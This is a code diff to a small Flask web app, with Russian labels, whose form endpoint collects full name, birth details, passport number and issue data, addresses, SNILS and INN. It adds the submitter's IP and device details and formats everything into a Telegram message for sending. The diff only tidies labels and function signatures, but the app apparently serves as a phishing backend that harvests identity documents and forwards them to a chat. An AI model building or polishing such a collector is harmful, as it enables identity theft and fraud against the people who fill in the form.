@@ -1,7 +1,9 @@
-from flask import Flask, render_template, send_from_directory, jsonify, request
-import requests
 from datetime import datetime
+
+import requests
+from flask import Flask, render_template, send_from_directory, request, jsonify
 from user_agents import parse
+
 
 app = Flask(__name__)
 
@@ -41,7 +43,7 @@ def parse_user_agent(user_agent_str):
     }
 
 
-def get_client_info():
+def get_client_info(request):
     """Собираем полную информацию о клиенте"""
     try:
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -76,26 +78,28 @@ def format_telegram_message(form_data, client_info):
 
     # Секция личных данных
     message += "👤 <b>Личные данные:</b>\n"
-    message += f"  • ФИО: {form_data.get('lastName', '')} {form_data.get('firstName', '')} {form_data.get('middleName', '')}\n"
-    message += f"  • Дата рождения: {form_data.get('birthDate', '')}\n"
-    message += f"  • Место рождения: {form_data.get('birthPlace', '')}\n\n"
+    message += f"  • Фамилия: {form_data.get('lastName', 'Не указано')}\n"
+    message += f"  • Имя: {form_data.get('firstName', 'Не указано')}\n"
+    message += f"  • Отчество: {form_data.get('middleName', 'Не указано')}\n"
+    message += f"  • Дата рождения: {form_data.get('birthDate', 'Не указано')}\n"
+    message += f"  • Место рождения: {form_data.get('birthPlace', 'Не указано')}\n\n"
 
     # Секция паспорта
     message += "📘 <b>Паспортные данные:</b>\n"
-    message += f"  • Номер: {form_data.get('passportNumber', '')}\n"
-    message += f"  • Выдан: {form_data.get('passportIssued', '')}\n"
-    message += f"  • Код подразделения: {form_data.get('passportCode', '')}\n"
-    message += f"  • Дата выдачи: {form_data.get('passportDate', '')}\n\n"
+    message += f"  • Номер паспорта: {form_data.get('passportNumber', 'Не указано')}\n"
+    message += f"  • Кем выдан: {form_data.get('passportIssued', 'Не указано')}\n"
+    message += f"  • Код подразделения: {form_data.get('passportCode', 'Не указано')}\n"
+    message += f"  • Дата выдачи: {form_data.get('passportDate', 'Не указано')}\n\n"
 
     # Секция адреса
     message += "🏠 <b>Адреса:</b>\n"
-    message += f"  • Регистрация: {form_data.get('registrationAddress', '')}\n"
-    message += f"  • Проживание: {form_data.get('livingAddress', '')}\n\n"
+    message += f"  • Адрес регистрации: {form_data.get('registrationAddress', 'Не указано')}\n"
+    message += f"  • Адрес проживания: {form_data.get('livingAddress', 'Не указано')}\n\n"
 
     # Секция документов
     message += "📄 <b>Документы:</b>\n"
-    message += f"  • СНИЛС: {form_data.get('snilsNumber', '')}\n"
-    message += f"  • ИНН: {form_data.get('innNumber', '')}\n\n"
+    message += f"  • СНИЛС: {form_data.get('snilsNumber', 'Не указано')}\n"
+    message += f"  • ИНН: {form_data.get('innNumber', 'Не указано')}\n\n"
 
     # Информация об устройстве
     message += "📱 <b>Информация об устройстве:</b>\n"
@@ -103,7 +107,8 @@ def format_telegram_message(form_data, client_info):
     message += f"({'Мобильное' if client_info['device'].get('is_mobile') else 'Десктоп'})\n"
     message += f"  • ОС: {client_info['device'].get('os', '')}\n"
     message += f"  • Браузер: {client_info['device'].get('browser', '')}\n"
-    message += f"  • Разрешение: {client_info['device'].get('screen_resolution', '')}\n"
+    if 'screen_resolution' in client_info['device']:
+        message += f"  • Разрешение: {client_info['device']['screen_resolution']}\n"
     message += f"  • Часовой пояс: {client_info['device'].get('timezone', '')}\n"
     message += f"  • IP: {client_info['network'].get('ip', '')}\n"
     message += f"  • Время: {client_info['timestamp']}\n"
@@ -133,7 +138,7 @@ def submit_form():
         form_data = request.json
 
         # Получаем информацию об устройстве
-        client_info = get_client_info()
+        client_info = get_client_info(request)
 
         # Формируем и отправляем сообщение
         message = format_telegram_message(form_data, client_info)
@@ -143,5 +148,7 @@ def submit_form():
 
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
+
+
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
